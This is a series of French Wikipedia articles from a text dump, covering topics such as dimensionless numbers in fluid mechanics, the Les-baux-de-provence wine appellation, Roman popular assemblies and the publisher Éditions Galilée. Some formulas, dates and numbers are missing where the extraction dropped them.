Le nombre de capillarité formula_1 est un nombre sans dimension utilisé en mécanique des fluides. Il est utilisé pour caractériser les flux biphasiques au travers de milieu poreux. Il représente le rapport entre les forces capillaires et les forces de filtration.
On le définit de la manière suivante :
formula_2
avec :

</doc>
<doc id="3215771" url="https://fr.wikipedia.org/wiki?curid=3215771" title="Nombre capillaire">
Nombre capillaire

Le nombre capillaire formula_1 est un nombre sans dimension utilisé en mécanique des fluides. Il représente le rapport entre les forces visqueuses et la tension superficielle et est utilisé pour caractériser l'atomisation des liquides. Il correspond également au ratio des nombres de Weber et de Reynolds.
On le définit de la manière suivante :
formula_2
avec :

</doc>
<doc id="3215795" url="https://fr.wikipedia.org/wiki?curid=3215795" title="Bechtolsheim">
Bechtolsheim

Le village-rue de Bechtolsheim (Rheinhessen) est une municipalité de l'arrondissement d'Alzey-Worms, en Rhénanie-Palatinat (Allemagne).
Histoire.
Histoire antique.
On a retrouvé des habitats de type villa rustica (les demeures rurales italiques) à quatre endroits à l'intérieur des limites communales. On a trouvé des lampes à huile romains et des pièces de monnaie à Bechtolsheim, témoignages des premiers siècles, à l'époque de l'empereur romain Marc Aurèle et Constantin le Grand.
Histoire médiévale.
Bechtolsheim est situé dans un cadre idyllique en Hesse rhénane. Ses vignobles ont été mentionnés, pour la première fois le avec une donation à l'Abbaye et Altenmünster de Lorsch et aussi à l'abbaye de Fulda. D´après les anciens documents, Armsheim était une fondation de Francs ripuaires après la bataille de Tolbiac. Le fondateur était le franc Bertholf ou Beratholf. Les seigneurs de Bolanden sont les seigneurs de domaine impérial. Les cohéritiers de Bechtolsheim («Ganerben», en ancien allemand «ganarpeo») sont membres d'une communauté d'héritiers qui cohabitent sur un bien hérité divisé, depuis le .
Bâtiments, Places et autres Monuments.
L'église renferme un précieux mobilier flamboyant : le banc d'église sculptés de 1496 par Erhart Falckener de Abensberg est l'un des rares bancs entièrement de style gothique flamboyant. Les couleurs originales restent celles de la décoration. Elles ont gardé leur polychromie et leurs inscriptions gothiques. Au total, il y a 30 banques avec les pommeaux octogonaux sculptés.
Le vin de Bechtolsheim.
Les vins dorés des crus "Wingertstor, Sonnenberg, Homberg" et "Klosterberg" fut partie des Großlage Petersberg des "Domaine de Nierstein ".

</doc>
<doc id="3215805" url="https://fr.wikipedia.org/wiki?curid=3215805" title="Nombre de condensation">
Nombre de condensation

Le nombre de condensation formula_1 est un nombre sans dimension utilisé en transfert thermique. Il est utilisé pour caractériser les écoulements des vapeurs condensées. Il existe deux versions de ce nombre.
"CoI".
On le définit de la manière suivante :
&lt;math&gt;Co_I = \frac {h}{\lambda} \left( \frac

</doc>
<doc id="3215806" url="https://fr.wikipedia.org/wiki?curid=3215806" title="Colt M-4">
Colt M-4



</doc>
<doc id="3215811" url="https://fr.wikipedia.org/wiki?curid=3215811" title="Les-baux-de-provence">
Les-baux-de-provence

Un les-baux-de-provence est un vin d'AOC rouge, rosé ou blanc produit sur sept communes autour des Baux-de-Provence, dans le massif des Alpilles, dans les Bouches-du-Rhône.
Le les-baux-de-provence est un vin d'assemblage, produit en rouge (55 % de la production en 2023), en rosé (32 %) et en blanc (13 %). C'est la plus occidentale des appellations du vignoble de Provence, les autres en étant, d'ouest en est :
Depuis 2023, la vendange est 100 % certifiée bio.
Histoire.
Préhistoire et Antiquité.
Des traces de vie ont été retrouvées et datées de -6000. La place fut utilisée par les Celtes comme un fort ou un oppidum autour du avant notre ère.
Justin, dans son "Abrégé des histoires philippiques" ("Historiarum Philippicarum", Livre XLIII, chap. IV,1-2), un ouvrage qu'il présente dans sa préface comme un florilège des passages les plus importants et les plus intéressants du volumineux "Historiæ phillippicæ et totius mundi origines et terræ situs" rédigé par Trogue Pompée à l’époque d’Auguste, explique : .
Moyen Âge.
Au Moyen Âge, il devint la place forte d'un domaine féodal contrôlant 79 villes et villages des alentours. La forteresse fut construite du , sur une vaste étendue de sept hectares. Les princes de Baux contrôlèrent la Provence pendant de nombreuses années et y gagnèrent une forte réputation. Ils disaient descendre du roi mage Balthazar, ajoutant à leurs armoiries, une étoile d'argent à seize branches, pour rappeler celle qui, selon l'Évangile, guida les trois mages vers Bethléem ; et leur devise était « Au hasard, Balthazar ».
Place-forte médiévale située aux confins du Languedoc, du Comtat Venaissin et de la Provence, la forteresse a connu une histoire militaire mouvementée et fit l'objet de nombreux assauts. Le solide donjon qui domine encore aujourd'hui rappelle l'importance de ce château, objet de toutes les convoitises, lors de l'époque médiévale.
Au les princes des Baux durent se soumettre à l'issue des guerres baussenques. Le grand château commença à être renommé pour sa cour fortement cultivée et chevaleresque. Le domaine s'éteint finalement au à la mort de la dernière princesse des Baux.
Période moderne.
Les Baux, ainsi que la Provence, sont alors rattachés à la couronne de France sous la férule de la famille Manville. Le village devint un centre du protestantisme et tenta même une révolte contre la couronne ce qui amena, en 1632, le cardinal de Richelieu à ordonner que le château et ses murs soient rasés.
En 1642, la ville fut offerte à la famille Grimaldi en tant que marquisat. Le titre de "marquis des Baux" leur est d'ailleurs encore rattaché. Administrativement, la ville est entièrement française et le titre de marquis des Baux est traditionnellement donné à l'héritier du trône monégasque. L'actuel prince de Monaco, Albert II, porte parmi ses nombreux titres celui de marquis des Baux.
Période contemporaine.
À partir des années 1830, la vigne est en pleine expansion dans le massif des Alpilles, alors qu'on ne la trouve guère auparavant. Mais l'épidémie de phylloxéra de 1871 provoque la perte des deux tiers des pieds. La recolonisation est lente mais régulière.
C'est l'arrêté du qui définit le VDQS des , auquel ont peut rajouter la mention si il est produit sur sept communes. Il est suivi par le décret daté du permettant l’utilisation de la dénomination « Les Baux » en complément de l'appellation , reconnaissant l’identité spécifique de la région des Baux-de-Provence. Le décret du supprime la dénomination et reconnait l'appellation les-baux-de-provence en rouge et rosé. Le blanc rejoint l'AOP en 2011. Le dernier cahier des charges a été modifié le .
Le dernier tiers du constate une régression de 50 % sur 30 ans de la surface plantée en vignes dans les Alpilles. Vers l'année 2000, seuls 5 % de la surface agricole utile des Alpilles sont consacrés à la culture de la vigne. Celle-ci est désormais quasi absente du versant nord où on ne la trouve guère plus qu'aux alentours du « canal des Alpines » (commune d'Orgon). Les pentes sud du massif sont en revanche davantage colonisées, notamment à Mouriès et dans le plaine des Baux-de-Provence.
Vignoble.
Présentation.
L’aire de production couvre le territoire de sept communes des Bouches-du-Rhône : Les Baux-de-Provence, Eygalières, Fontvieille, Mouriès, le Paradou, Saint-Étienne-du-Grès et Saint-Rémy-de-Provence.
Ces sept communes font désormais également partie de l'aire d'appellation du coteaux-d'aix-en-provence.
Orographie et géologie.
Situé au nord-ouest d’Aix-en-Provence, ce vignoble occupe les piémonts nord et sud de la partie occidentale des Alpilles, culminant à 490 m d’altitude et s’allongeant sur une trentaine de kilomètres d’est en ouest entre le Rhône, la Durance et la plaine de La Crau, dont la partie centrale est occupée par le territoire de la commune des Baux de Provence.
Le massif des Alpilles est érodé et se caractérise par des reliefs taillés en biseau dans les formations marno-calcaires du Crétacé inférieur et dans les calcaires durs du Jurassique. Il comporte des replats caillouteux et de petites dépressions creusées dans les argilites du Crétacé supérieur ou dans les molasses sableuses et calcaires du Miocène.
Les épandages de pente et colluvions sont caractéristiques de la région. Ils sont très caillouteux ; on les trouve sous forme de glacis, cônes de déjection, éboulis ou grèzes lithées. Ces dépôts caillouteux d’origine cryoclastique (würmiens ou postwürmiens) sont caractéristiques de cette région. Les parcelles de vigne sont principalement implantées en terrasses ou en coteaux, sur les deux versants des Alpilles.
Climatologie.
Le climat aux Baux-de-Provence, comme dans le massif des Alpilles, est considéré comme méditerranéen. Les hivers y sont doux et secs et les étés chauds et secs. La température moyenne maximale est observée en juillet et août (+29 °C), la température moyenne minimale en décembre et janvier (+3 °C). Le mois le plus pluvieux est janvier avec 7 jours de pluie en moyenne, contre 2 jours en juillet. La région des Alpilles reçoit davantage de précipitations que le littoral de la Méditerranée : /an en Camargue contre /an aux Baux. Les grandes gelées sont très rares, alors qu'elles étaient plus fréquentes au , comme en témoignent les nombreux gels du Rhône, quasiment inconnus depuis le siècle dernier.
Le mistral y souffle violemment du nord ou du nord-ouest, particulièrement en hiver et au printemps. Les Alpilles dévient le vent, mais le vent souffle aux Baux pratiquement aussi fort que dans le nord de la chaîne. Le mistral souffle fortement 100 jours par an en moyenne et faiblement 83 jours, ce qui ne laisse que 182 jours sans vent par an. On distingue deux types de mistral : le « mistral blanc », qui dégage le ciel en totalité et accentue la luminosité, et le « mistral noir », plus rare, qui est accompagné de pluie.
La station météorologique de Saint-Rémy-de-Provence (au lycée agricole, à d'altitude : ) se situe au nord des Alpilles.
Encépagement.
Pour les vins rouges et rosés :
Les cépages autorisés pour les vins blancs sont autorisés pour les rosés jusqu'à un maximum de 10 % de l'encépagement.
Pour les vins blancs :
Méthodes culturales et réglementation.
Le vignoble a une densité de plantation de .
Les vignes sont conduites en taille courte, gobelet ou cordon de Royat, avec un maximum de six coursons à un ou deux yeux par souche.
Le rendement visé par le cahier des charges est de 50 hl/ha et constitue aussi le rendement butoir.
Vins.
Volumes.
Les données de production des années récentes, telles que publiées par les Douanes, sont :
Gastronomie.
Les vins rouges sont charnus, robustes, charpentés avec une bonne réserve tannique anoblie pour l’élevage ; notes végétales (romarin, tabac) évoluant vers des notes de fruits noirs ou animales (ambre, gibier). Les vins rouges doivent faire l’objet d’un élevage minimum de douze mois.
Les vins rosés sont destinés à la table. Les arômes évoquent les fraises écrasées, les groseilles ou encore les bonbons anglais. Ils sont généralement structurés et rustiques avec des caractères fruités, floraux ou empyreumatiques.
Les vins blancs offrent une large palette aromatique : notes de miel et de fruits exotiques, arômes de pêche et d’agrumes, et parfois même une légère amertume. La bouche se caractérise par sa fraîcheur et sa minéralité et sa richesse.
En termes d'association mets-vins :
Économie.
Commercialisation.
Chaque année, à Saint-Rémy-de-Provence, les coteaux-des-baux accueillent des vins venus de toute la France le dernier week-end de juillet.
Producteurs.
Liste exhaustive des producteurs :

</doc>
<doc id="3215827" url="https://fr.wikipedia.org/wiki?curid=3215827" title="AOC Coteaux des Baux-en-Provence">
AOC Coteaux des Baux-en-Provence



</doc>
<doc id="3215837" url="https://fr.wikipedia.org/wiki?curid=3215837" title="Coteaux des Baux-en-Provence (AOC)">
Coteaux des Baux-en-Provence (AOC)



</doc>
<doc id="3215847" url="https://fr.wikipedia.org/wiki?curid=3215847" title="Assemblées romaines">
Assemblées romaines

À Rome, les assemblées du Peuple exercent principalement deux fonctions : adopter les lois et élire les magistrats. 
Le fonctionnement d'une assemblée du Peuple est étroitement contrôlé par le magistrat qui la préside en application de règles religieuses et juridiques issues de la tradition ancestrale et complétées par des textes legislatifs. En l'absence de constitution formelle, de simples lois peuvent modifier les règles applicables. 
Ces assemblées fonctionnent sur la base de la démocratie directe, puisque tous les citoyens, et non des représentants élus, y votent, mais leur composition complexe tend à limiter l'égalité entre les citoyens et àdonner la prééminence aux plus fortunés. 
Dans le système romain, les lois sont votées (et les magistrats élus) par des curies (comices curiates), tribus (comices tributes) et centuries (comices centuriates). 
Cette segmentation du corps électoral correspond à des critères censitaires dans le cas des comices centuriates et géographiques dans le cas des comices tributes, dans tous les cas elle restreint l'autonomie de ces assemblées. Aucune de ses assemblées n'a l'initiative ou le contrôle de ses réunions, pas plus qu'elles ne peuvent discuter ou amender les projets de loi qui leur sont soumis. Enfin ce n'est que dans les années 130 av. J.-C. que la pratique du vote secret y est introduite.
Quand la ville de Rome est fondée (traditionnellement datée de 753 av. J.-C.), un Sénat et une assemblée, les comices curiates, auraient été créés par Romulus. Les comices curiates auraient été la principale assemblée législative sous l’ère de la Monarchie romaine. Alors que son rôle principal aurait été d’élire les nouveaux rois, elle aurait possédé aussi des pouvoirs législatifs rudimentaires. Peu après la fondation de la République romaine (traditionnellement datée de 509 av. J.-C.), la principale autorité législative aurait ete transférée à deux nouvelles assemblées, les comices tributes (« assemblée des citoyens ») et les comices centuriates (« assemblée de l’armée »). 
Finalement, à partir de l'époque des Gracques, la plupart des procédures législatives reviennent au concile plébéien, c'est-à-dire aux comices tributes convoqués par un tribun de la plèbe et d'où sont exclus les patriciens. En définitive, c’est le concile plébéien qui perturbe l’équilibre entre le Sénat, les Comices et les magistrats. Cela mène à la chute de la République et à l’instauration de l’Empire romain en 27 av. J.-C. Sous l’Empire, les pouvoirs que détiennent les assemblées perdent leur dernière apparence de puissance politique, les citoyens continuant à se rassembler à des fins d’organisation. Cependant, les assemblées sont finalement abandonnées.
Assemblées sous la royauté.
Sous la royauté, la Tradition affirme que le Peuple était divisé en unités appelées « curie » ("curia"). Les trente curies sont organisées pour ressembler à la répartition ethnique de Rome sous les rois. 
Les comices curiates, possèdent théoriquement quelques pouvoirs législatifs et électoraux. Les citoyens de Rome ne votent pas individuellement dans les comices curiates puisqu'ils sont divisés en trente curies, et votent dans chaque curie. La majorité des voix dans chacune des trente curies détermine l’unique voix de la curie entière dans l’assemblée.
Comices curiates.
Les comices curiates sont la seule assemblée populaire ayant la moindre signification politique durant la période de la Monarchie romaine. Elles sont organisées sur la base des trente curies. Le roi préside l’assemblée et y soumet des décrets pour leurs ratifications. Un "interrex" la préside durant les périodes d’intérim entre deux rois (l’"interregnum"), et ainsi pour l’élection d’un nouveau roi.
Cette assemblée peut se réunir pour quatre raisons : l’élection d’un nouveau roi, prendre connaissance des annonces, écouter un appel et voter les décisions législatives.
Comices calates.
Les comices calates (« assemblée calate ») sont la plus vieille des assemblées romaines. On en sait très peu à son sujet. Comme les comices curiates, les comices calates sont organisées sur la base des trente curies. Le but de cette assemblée est de décider des diverses affaires religieuses (telles que l’intronisation des prêtres et la sélection des futures vestales). Le "pontifex maximus" préside cette assemblée.
Assemblées législatives de la République romaine.
Il existe deux types d’assemblées romaines : les comices ("comitia") et les conciles ("concilium").
Les comices sont les assemblées de tous les citoyens ("populus Romanus" ou peuple de Rome). Les comices sont utilisés à des fins officielles comme la ratification des lois. Les décisions des comices s’appliquent à tous les membres de ces comices (c'est-à-dire à tout le peuple de Rome).
Le second type d’assemblées, les conciles, sont des forums ("fora") où des groupes spécifiques de citoyens se réunissent dans un but officiel (ratification des lois). Par exemple, le concile plébéien ("concilium plebis") est un concile où se réunissent les plébéiens. Les décisions d’un concile s’appliquent aux membres du concile considéré. C’est pourquoi, par exemple, les décisions prises par le concile plébéien (« plébiscites ») ne s’appliquent à l’origine qu’aux seuls plébéiens.
Au contraire des comices et des conciles, une "conventio" est un forum à caractère officieux où les Romains peuvent se réunir pour écouter un discours politique. Les citoyens ordinaires peuvent seulement s’exprimer devant ce genre d’assemblée (et non devant un comice ou un concile). Ces "conventiones" sont de simples réunions plutôt qu’un moyen permettant de légiférer. En fait, les votants se rassemblent d’abord en "conventiones" pour entendre chaque discours puis se réunissent en comices ou conciles afin de voter de façon effective.
Avant que chaque réunion ne commence, les auspices (une recherche de présages envoyés par les dieux) doivent être pris. Le jour de l’assemblée, les électeurs se réunissent en "conventio". Pendant tout ce temps, ils peuvent écouter les discours et écouter la lecture de billets par un héraut. Les électeurs sont ensuite amenés à rejoindre leurs centuries, tribus ou curies respectives. Les votes (sous forme de cailloux ou de billets manuscrits) sont collectés, comptés et le résultat est apporté au magistrat qui préside. Les votes de tous les membres d’une centurie, tribu ou curie ne comptent que pour un vote (c'est-à-dire que, par exemple, les votes des membres de la même centurie ne représentent qu’un seul vote, celui de la majorité au sein de la centurie). Si le processus n’est pas terminé à la tombée de la nuit, les électeurs sont renvoyés sans avoir pris une décision. Le processus est recommencé à nouveau le jour suivant.
Comices curiates.
Durant la première décennie de la République, le peuple de Rome est réparti en trente curies. Les curies sont organisées sur la base des "gentes" (parenté ethnique). En ce temps, les centuries et tribus ne sont pas utilisées à des fins politiques. Les curies se rassemblent dans des buts législatifs, électoraux et judiciaires sous forme de comices curiates, présidées par un consul. Peu après la fondation de la République, les pouvoirs des comices curiates sont transférés aux comices centuriates et aux comices tributes.
Les comices curiates devenus obsolètes restent présidés par un consul. Toute loi ratifiée par cette assemblée peut être bloquée par le "veto" d’un tribun de la plèbe. L’activité de cette assemblée est dépendante des auspices.
Après qu’ils sont tombés en désuétude, le principal rôle législatif des comices curiates est de passer la loi annuelle "lex curiata de imperio". Théoriquement, cette loi est nécessaire à la ratification des élections des consuls et préteurs, leur transmettant l’"imperium". Néanmoins, en pratique, il s’agit plutôt d’une simple cérémonie facultative.
Les curies sont organisées à partir des "gentes" (ou parenté ethnique, les familles). Par conséquent, bien après que les comices curiates ont perdu une grande partie de leurs pouvoirs politiques, elles conservent la juridiction des problèmes liés aux "gentes".
Sous la direction du "pontifex maximus", les comices curiates s’occupent des vœux et adoptions. Ils peuvent également introniser certains prêtres et transférer des citoyens des classes patriciennes vers les classes plébéiennes.
À un moment donné, peut-être dès 218 av. J.-C., les trente curies des comices curiates sont abolies et remplacées par trente licteurs.
Comices centuriates.
Pendant toute la République romaine, les citoyens sont répartis en centuries à des fins militaires, et en tribus à des fins civiles. Chacun des deux groupes (centuries et tribus) se rassemble pour des buts législatifs, électoraux et judiciaires. L’assemblée des centuries s’appelle les comices centuriates ("comitia centuriata").
Le président des comices centuriates est généralement un consul. Depuis qu’ils élisent les magistrats, on les considère comme ses représentants. Ainsi, les comices centuriates sont présidés par son propre représentant élu.
Les 193 centuries (plus tard on en comptera 373) sont divisées en plusieurs niveaux. Il y a les "equites", les "pedites" et les adjoints non-armés.
Les "equites" (la cavalerie) représentent le plus haut grade des soldats montés. Ils sont l’élite de l’armée et ont le grade d’officier. Les "equites" sont organisés en 18 centuries.
Les 170 centuries de "pedites" constituent l’infanterie de l’armée romaine. Les "pedites" sont divisés en cinq classes, chacune de ces cinq classes est elle-même divisée en centuries de "iunores" (jeunes soldats, 17 à 45 ans) et de "seniores" (vieux soldats, 46 à 60 ans).
Les soldats non-armés sont répartis dans les cinq dernières centuries. Quatre de ces centuries se composent d’artisans et de musiciens. La cinquième centurie, les "proletarii", consiste en soldats ayant peu ou pas de propriété.
Les comices centuriates sont organisés à l’origine (temps qui remonterait au règne du roi Servius Tullius) d’une manière très aristocratique (organisation servienne). Selon cette organisation, les classes les plus élevées (cavalerie et première classe d’infanterie) contrôlent suffisamment de centuries pour obtenir la majorité à chaque vote. En 241 av. J.-C., une réorganisation de l’assemblée la rend plus démocratique. Sous l’ancien système, il y avait un total de 193 centuries. Sous le nouveau système, on compte 373 centuries. Dorénavant, la majorité ne peut pas être atteinte à coup sûr avant que la troisième classe d'infanterie n’ait commencé à voter.
Les sept classes (une classe de cavalerie, cinq classes d’infanterie et une classe de soldats non-armés) votent par ordre d’ancienneté. Les centuries de chaque classe votent une par une, jusqu’à ce que toute la classe ait voté. Selon Cicéron, l’assemblée est délibérément arrangée de telle sorte que le petit peuple (le plus grand nombre) n’ait que peu de pouvoir. Selon Tite-Live, le but est que chacun puisse voter, mais que le vote des "meilleurs individus" de l’état ait plus de poids.
Ils peuvent promulguer une loi qui donne les pouvoirs de l’"imperium" aux consuls et préteurs ainsi que les pouvoirs de la censure aux censeurs. De plus, seuls les comices centuriates peuvent élire les consuls, préteurs et censeurs, déclarer une guerre offensive, ou encore valider le cens (recensement des citoyens par classes). Ils servent aussi comme la plus haute cour d’appel dans certains cas de justice (en particulier, les cas punis de la peine capitale). Bien que les comices centuriates aient le pouvoir de ratifier les lois ordinaires, ils ne s’en servent que rarement.
Comices tributes.
Durant la République, les tribus se rassemblent en deux assemblées : le concile plébéien ("concilium plebis") et les comices tributes ("comitia tributa"). En effet, le concile plébéien est l’assemblée des tribus plébéiennes alors que les comices tributes sont l’« assemblée tribale patricio-plébéienne ».
La seule différence entre les deux assemblées réside dans ce que les patriciens ne peuvent voter dans le concile plébéien. Comme les patriciens en sont exclus, le concile plébéien ne représente pas tout le peuple, de sorte que le concile ne peut pas élire de magistrats. Mais le concile plébéien élit ses propres représentants (tribuns de la plèbe et édiles plébéiens).
Le président des comices tributes est généralement un consul. Plusieurs autres magistrats peuvent être présents pendant les réunions, pour servir comme adjoints. Leur principal objectif est d’aider à résoudre les désaccords concernant la procédure. Les comices tributes élisent les questeurs, les édiles curules et les tribuns militaires. Ils ont également le pouvoir d’instruire des cas judiciaires. Bien que les comices tributes aient le pouvoir de promulguer de nouvelles lois, ils ne s’en servent que rarement.
Les comices tributes et le concile plébéien se composent de 35 groupes appelés tribus. Celles-ci ne sont pas basées sur des considérations ethniques ou par liens de parenté mais sur les divisions géographiques. C’est ce qui distingue les tribus des curies. Contrairement aux centuries, l’appartenance à une tribu ne dépend pas de la richesse.
Concile plébéien.
Avant la première sécession de la plèbe (494 av. J.-C.), les plébéiens se réunissent probablement en une assemblée basée sur les curies. Néanmoins, cette assemblée n’a pas de rôle politique jusqu’à la création des magistratures du tribunat et de l’édilité plébéienne, à la suite de la sécession plébéienne. Le tribun commence à présider le concile plébéien peu après 494 av. J.-C. Cette assemblée peut élire à la fois les tribuns et les édiles plébéiens. Elle peut aussi légiférer en votant des plébiscites qui, aux débuts de la République, ne s’appliquent qu’aux seuls plébéiens.
Autour de 471 av. J.-C., le concile plébéien est réorganisé. Il commence à utiliser les tribus, plutôt que les curies, comme base de son organisation. Quand il était organisé par curies (et donc par "gentes"), les plébéiens étaient dépendants de leurs patrons patriciens. Quand le concile plébéien est passé à une organisation basée sur les tribus (c'est-à-dire dépendant de considération géographique), les plébéiens ont gagné leur indépendance vis-à-vis des patriciens.
À la suite de la ratification de toute une série de lois, dont la principale est la "Lex Hortensia" de 287 av. J.-C., force de loi est donnée aux résolutions prises par le concile ("plebiscites"), qui s’appliquent non plus aux seuls plébéiens comme c’était le cas avant, mais à tout le peuple de Rome. À partir de ce moment, la plupart des lois ratifiées proviennent du concile plébéien. Comme le concile n’est composé que de plébéiens, il est beaucoup plus populiste que les comices tributes. Par conséquent, il se trouve en général derrière les réformes controversées (telles que celles lancées par les tribuns Tiberius et Caius Sempronius Gracchus).
Assemblées législatives de l’Empire romain.
Sous le règne du deuxième empereur, Tibère, les pouvoirs tenus par les assemblées législatives, ou comices, sont transférés au Sénat.
Comices centuriates.
Sous l’Empire, les soldats continuent à s’organiser par centuries. Cependant, après la chute de la République, les centuries perdent de leur pertinence. La division des comices centuriates en centuries de "seniores" (vieux soldats) et de "iuniores" (jeunes soldats) continue bien sous l’empire, ainsi que la classification des centuries basée sur les biens.
La législation n’a jamais été soumise aux comices centuriates impériales. Après l’instauration de l’Empire, tous les pouvoirs judiciaires que détiennent les comices centuriates républicaines sont transférés à des cours de justice indépendantes ("quaestiones"). Sous l’empereur Tibère, tous les pouvoirs électoraux sont à leur tour transférés au Sénat.
Après que les comices centuriates ont perdu leurs pouvoirs législatifs, judiciaires et électoraux, il ne leur reste aucune autorité. Dès lors, leur seule fonction est d’écouter le "renuntiatio". Le "renuntiatio" est entendu après que le Sénat a "élu" les magistrats. C’est une cérémonie dans laquelle les résultats de l’élection sont lus aux électeurs. Le "renuntiatio" permet à l’empereur de prétendre que les magistrats sont élus par le peuple souverain.
Comices tributes.
Après la fondation de l’Empire, la division en tribus des citoyens et des affranchis continue. Le seul but politique de cette division est qu’elle permet au Sénat de tenir une liste des citoyens. La division en tribus simplifie aussi le processus de distribution du grain.
Toute législation que l’empereur soumet aux assemblées pour ratification est soumise aux comices tributes.
Sous l’empereur Tibère, les pouvoirs électoraux des comices tributes sont transférés au Sénat. Chaque année, après que le Sénat a "élu" les magistrats annuels, les comices tributes écoutent le "renuntiatio". Le "renuntiatio" sert à la même fonction aux comices tributes que pour les comices centuriates.
Concile plébéien.
Le concile plébéien survit à la chute de la République. Il perd cependant ses pouvoirs législatifs, judiciaires et électoraux au profit du Sénat. En vertu de ses pouvoirs tribuniciens, l’empereur a toujours un contrôle absolu sur le concile plébéien.
Comices curiates.
Après la chute de la République, les comices curiates ne votent plus longtemps la "lex curiata de imperio". Ce pouvoir est aussi transféré au Sénat. Après la fondation de l’empire, l’assemblée continue de se composer de trente licteurs. Les seules deux fonctions des comices curiates impériales sont d’être témoins des testaments et de ratifier les adoptions.

</doc>
<doc id="3215863" url="https://fr.wikipedia.org/wiki?curid=3215863" title="Josep Ayala">
Josep Ayala

Josep Ayala, né le à Sant Julià de Lòria (Andorre), est un footballeur international andorran. Il évolue depuis 2009 au FC Santa Coloma au poste de milieu de terrain.
Biographie.
Il est l'un des joueurs les plus capés de l'équipe d'Andorre de football avec et inscrit face à la Moldavie le en match amical (défaite 2-1). 
Lors de la saison 2005-2006, avec son compère de la sélection andorranne Antoni Sivera, il connaît sa première expérience à l'étranger en signant dans le club ariégeois de l'US Luzenac en CFA français.

</doc>
<doc id="3215865" url="https://fr.wikipedia.org/wiki?curid=3215865" title="Culture juive">
Culture juive



</doc>
<doc id="3215869" url="https://fr.wikipedia.org/wiki?curid=3215869" title="JAZZ plus plus">
JAZZ plus plus



</doc>
<doc id="3215870" url="https://fr.wikipedia.org/wiki?curid=3215870" title="Allemagne aux Jeux olympiques d'été de 2004">
Allemagne aux Jeux olympiques d'été de 2004

Résultats par sport.
Boxe.
L'Allemagne a envoyé quatre boxeurs aux Jeux olympiques d'été de 2004 à Athènes. La boxe a rapporté deux médailles de bronze.
Gymnastique.
Hockey sur gazon.
Effectif
Effectif
Pentathlon moderne.
Hommes :
Femmes :
Tennis.
Simples hommes
doubles hommes
Triathlon.
Femmes :
Hommes :

</doc>
<doc id="3215872" url="https://fr.wikipedia.org/wiki?curid=3215872" title="Éditions Galilée">
Éditions Galilée

Éditions Galilée est une maison d'édition française située à Paris et créée en 1971 par Michel Delorme. Elle est spécialisée dans la philosophie, la littérature française, les arts et les sciences humaines. Éditeur du courant déconstructionniste théorisé par Jacques Derrida, la maison Galilée est également proche de la pensée postmoderniste (Jean Baudrillard, Jean-François Lyotard, etc).
En 2008, le catalogue compte environ 900 titres et elle est dirigée par Michel Delorme (PDG, directeur éditorial).
Histoire.
Née en 1971, la maison d'édition publie en 1973 "Critique du capitalisme quotidien" de Michel Bosquet, "Les Figures juives de Marx" d'Élisabeth de Fontenay, "Le Discours impur" de Jean-Noël Vuarnet, "Camera obscura : de l'idéologie" de Sarah Kofman, "Le Titre de la lettre" de Philippe Lacoue-Labarthe et Jean-Luc Nancy, "L'Archéologie du frivole" de Jacques Derrida en préface à "L'Essai sur l'origine des connaissances humaines" de Condillac et "La Remarque spéculative" de Jean-Luc Nancy.
Moins d'un an plus tard, Derrida, Nancy, Lacoue-Labarthe et Kofman créent la collection « La philosophie en effet », que Derrida inaugure avec la publication de "Glas". C'est dans cette même collection que Sarah Kofman fait paraître peu après "Quatre romans analytiques".
En 1974, Georges Perec publie aux éditions Galilée "Espèces d'espaces", bientôt suivi d"'Alphabets" en 1976.
En 1974 et 1975, les éditions Galilée publient les cinq premiers numéros de la revue "Digraphe", dirigée par Jean Ristat, ainsi que plusieurs numéros de la revue "Chorus" dirigée par Pierre Tilman.
La rencontre avec les artistes, le travail dans et par le livre avec les créateurs, axe fondateur de Galilée, se déploie avec les parutions de "Marcel Duchamp ou le grand fictif" de Jean Clair, "L'Invention du corps chrétien" de Jean-Louis Schefer, tandis que Wifredo Lam publie "Dessins" (1975). Puis c'est "Détruire la peinture" de Louis Marin, "Les Transformateurs Duchamp" de Jean-François Lyotard (1977). "Oublier Foucault" de Jean Baudrillard, "Fondements pour une morale" d'André Gorz, "L'Éboulement" de Jacques Dupin, "Vitesse et politique" de Paul Virilio paraissent également en 1977. Ce sont ensuite deux ouvrages majeurs de Claude Esteban, "L'immédiat et l'inaccessible" et "Un lieu hors de tout lieu".
En 1979, Christian Boltanski dessine, pour "Farce" de Jean-Marie Touratier, une couverture originale et réalise un tirage à part où une fenêtre ouverte à même le livre insère un sucre taillé par Boltanski en 1971 dans une cage grillagée. Pierre Restany publie "L'Autre Face de l'art" cette même année.
En 1980, Jean Baudrillard publie "De la séduction", Jean Oury : "Onze heures du soir à la Borde", Jean-Clarence Lambert : "Le Noir de l'azur", puis en 1984, Jean-Joseph Goux, "Les monnayeurs du langage", Christine Buci-Glucksmann : "La Raison baroque" et en 1986, Michel Ragon : "25 ans d'art vivant" ; enfin, pour clore cette décennie, Galilée publie en 1989 "Essais sur Sartre" de Michel Sicard et "Cartographies schizoanalytiques" de Félix Guattari.
Les rejoignent au fil des années : Bernard Stiegler dont le premier titre paru chez Galilée est "La Technique et le Temps" en 1994, Philippe Bonnefis (premier titre paru chez Galilée : "Parfums", en 1995), Ignacio Ramonet ("Géopolitique du chaos", 1997), Hélène Cixous ("Voiles", avec Jacques Derrida, 1998), Michel Deguy ("La Raison poétique", 2000), Serge Margel ("Logique de la nature", 2000), Michel Onfray ("Célébration du génie colérique", 2002), Marc Crépon ("Terreur et poésie", 2004), Pascal Quignard ("Écrits de l'éphémère", 2005, parmi cinq autres livres du même auteur parus cette année-là), Joseph Cohen ("Le spectre juif de Hegel", 2005), Stéphane Sangral ("Méandres et Néant", 2013), et beaucoup d'autres.
Les artistes ont toujours été présents : Valerio Adami, Pierre Alechinsky, Karel Appel, Christian Boltanski, Pol Bury, Guillaume Corneille, Leonardo Cremonini, Henri Cueco, Dado, Jacques Doucet, Erro, Gérard Garouste, Peter Klasen, Jean Le Gac, Simon Hantaï, Paul Jenkins, François Martin, Raymond Mason, Jacques Monory, Danièle Noël, Ernest Pignon-Ernest, François Rouan, Antonio Segui, Takis, Antoni Tapies, Vladimir Veličković, Maria Helena Vieira da Silva…, ainsi qu'en témoignent les tirages de tête et les grandes marges de nombreuses publications.

</doc>
<doc id="3215882" url="https://fr.wikipedia.org/wiki?curid=3215882" title="Cathédrale d'Espoo">
Cathédrale d'Espoo

La cathédrale d'Espoo ("Espoon tuomiokirkko" en finnois, "Esbo domkyrka" en suédois) est une église de style médiéval située à Espoo en Finlande. 
